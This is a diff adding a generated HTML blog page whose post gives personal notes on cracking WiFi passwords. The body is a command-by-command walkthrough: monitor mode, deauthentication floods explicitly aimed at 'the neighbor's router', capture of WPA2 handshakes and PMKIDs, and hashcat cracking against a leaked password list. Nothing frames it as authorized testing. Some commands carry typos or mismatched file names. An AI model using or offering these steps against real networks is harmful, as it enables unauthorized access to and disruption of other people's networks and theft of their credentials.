@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Sniffing packets and testing those | Mohit Dulani</title>
+<meta name="keywords" content="">
+<meta name="description" content="Wireless Network Adapter aka wifi card that is used to connect to wifi&rsquo;s
+WEP : oldest
+WPA : Any certificate can lead to leak
+WPA2 : kick a user, then he reconnects, capture the certificate, 4-way handshake ,capture the certificate in betweeen
+WPA3 : all password attempts need to be on internet
+Monitor mode
+In this mode it becomes a radio sniffer, listens to all wireless signals in the air on a specific channel. Hear&rsquo;s everything happening in the room">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/blog/broken-wifi/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css" integrity="sha256-IhHKMWS&#43;eDACT2qtKzouUghDpk&#43;PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/blog/broken-wifi/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Mohit Dulani (Alt + H)">Mohit Dulani</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/list_100/" title="List 100">
+                    <span>List 100</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Sniffing packets and testing those
+    </h1>
+    <div class="post-meta"><span title='2021-06-21 00:00:00 +0000 UTC'>June 21, 2021</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p>Wireless Network Adapter aka wifi card that is used to connect to wifi&rsquo;s</p>
+<p>WEP : oldest
+WPA : Any certificate can lead to leak
+WPA2 : kick a user, then he reconnects, capture the certificate, 4-way handshake ,capture the certificate in betweeen<br>
+WPA3 : all password attempts need to be on internet</p>
+<h2 id="monitor-mode">Monitor mode<a hidden class="anchor" aria-hidden="true" href="#monitor-mode">#</a></h2>
+<p>In this mode it becomes a radio sniffer, listens to all wireless signals in the air on a specific channel. Hear&rsquo;s everything happening in the room</p>
+<p>Wifi card can listen to 2.4Ghz, 5Ghz, 6Ghz bands</p>
+<p>It can sniff to any frequency band that its capable of in the above range</p>
+<p>So what you do is you deauth the neighbor&rsquo;s router by sending &lsquo;deauthentication packets&rsquo; ? ( how can I send deauth packets ? )
+deauth is broken, part of 802.11 management frames, are not protected in WPA/WPA2 - Personal , can be spoofed / faked by anyone in the range</p>
+<p>Particular client deauth attack</p>
+<pre tabindex="0"><code>BSSID              STATION            PWR   Rate    Lost    Frames  Probes
+AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -45   1e-1     0       800     -
+</code></pre><p>Station MAC is the client MAC</p>
+<p>Get all clients :
+<code>airodump-ng --bssid &lt;router MAC&gt; -c &lt;channel&gt; wlo1mon</code></p>
+<p>Deauth bombing:
+<code>aireplay-ng --deauth 100 -a &lt;router MAC&gt; wlo1mon</code></p>
+<p>Deauth particular user :
+<code>aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlo1mon</code></p>
+<p>When the client connects back, we capture the 4-way handshake packets EAPOL Packets, and they are stored to the .cap files</p>
+<p>We dont need to decrypt this, rather we just need to match with the leaked password list and get the wifi password !!</p>
+<h1 id="scan-the-wifi-">scan the wifi :<a hidden class="anchor" aria-hidden="true" href="#scan-the-wifi-">#</a></h1>
+<p>sudo iwlist scan</p>
+<h1 id="top-networks">top networks<a hidden class="anchor" aria-hidden="true" href="#top-networks">#</a></h1>
+<p>sudo airdump-ng start wlo1mon , or ,
+sudo airodump-ng wlo1mon &ndash;write scan &ndash;output-format csv</p>
+<h1 id="set-the-channel-to-capture">set the channel to capture<a hidden class="anchor" aria-hidden="true" href="#set-the-channel-to-capture">#</a></h1>
+<p>sudo iw dev wlo1mon set channel 1</p>
+<h1 id="get-all-wifi-present-and-bssid">get all wifi present and bssid<a hidden class="anchor" aria-hidden="true" href="#get-all-wifi-present-and-bssid">#</a></h1>
+<p>sudo iw dev wlo1 scan</p>
+<h2 id="get-into-monitor-mode">Get into monitor mode<a hidden class="anchor" aria-hidden="true" href="#get-into-monitor-mode">#</a></h2>
+<p>sudo airmon-ng start wlo1</p>
+<h2 id="manager-mode">manager mode<a hidden class="anchor" aria-hidden="true" href="#manager-mode">#</a></h2>
+<p>sudo airmon-ng stop wlo1mon</p>
+<h2 id="airodump-">airodump :<a hidden class="anchor" aria-hidden="true" href="#airodump-">#</a></h2>
+<p>sudo airodump-ng &ndash;bssid <!-- raw HTML omitted --> -c <!-- raw HTML omitted --> -w capture wlo1mon</p>
+<p>eg:
+sudo airodump-ng &ndash;bssid 6c:4f:89:9a:3f:af -c 44 -w capture wlo1mon</p>
+<h2 id="aireplay">aireplay<a hidden class="anchor" aria-hidden="true" href="#aireplay">#</a></h2>
+<p>sudo aireplay-ng &ndash;deauth 20 -a 6c:4f:89:9a:3f:af wlo1mon &ndash;ignore-negative-one</p>
+<h1 id="hashcat-for-wpa-2">HASHCAT for WPA-2<a hidden class="anchor" aria-hidden="true" href="#hashcat-for-wpa-2">#</a></h1>
+<h2 id="pmkid--pairwise-master-key-identifier-pmkid-">PMKID ( Pairwise Master Key Identifier (PMKID) )<a hidden class="anchor" aria-hidden="true" href="#pmkid--pairwise-master-key-identifier-pmkid-">#</a></h2>
+<h1 id="hcxdump-tool">hcxdump-tool<a hidden class="anchor" aria-hidden="true" href="#hcxdump-tool">#</a></h1>
+<p>sudo hcxdumptool -i wlo1mon -w pmkid.pcapng &ndash;rds=1</p>
+<h1 id="tool-to-unpack">Tool to unpack<a hidden class="anchor" aria-hidden="true" href="#tool-to-unpack">#</a></h1>
+<p>hcxpcapngtool -o pmkid.hccapx pmkid.pcapng</p>
+<h1 id="decode">Decode<a hidden class="anchor" aria-hidden="true" href="#decode">#</a></h1>
+<p>hashcat -m 22000 pmkid.hc22000 rockyou.txt &ndash;force</p>
+<p><img alt="hacked" loading="lazy" src="https://github.com/user-attachments/assets/8ab726b5-c6b8-43e9-b184-a7207d1f3163"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Mohit Dulani</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
